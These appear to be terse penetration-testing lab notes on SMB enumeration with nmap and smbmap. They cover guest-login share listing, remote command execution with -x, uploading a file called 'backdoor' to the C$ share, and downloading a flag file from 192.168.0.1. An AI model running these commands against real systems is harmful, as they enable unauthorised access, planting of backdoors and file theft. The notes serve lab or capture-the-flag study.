

--script smb-protocols  | version information 

smbmap -u guest -p "" -d . -H 192.168.0.1 | user/pass/directory/host |will give us shares and permissions 

smbmap -u guest -p "" -d . -x 'ipconfig' -H 192.168.0.1 | added -x which runs command 

-x any command -L

-r 'C$' to connect to drive it will do 'ls' command on drive 

we can make
upload backdoor file and put it in C drive 
create file in current directory 
touch backdoor
smbmap -u guest -p "" -d . --upload '/root/backdoor' 'C$\\backdoor'-H 192.168.0.1

we could reverse and
download file 

smbmap -u guest -p "" -d . --download 'C$\\flag.txt'-H 192.168.0.1
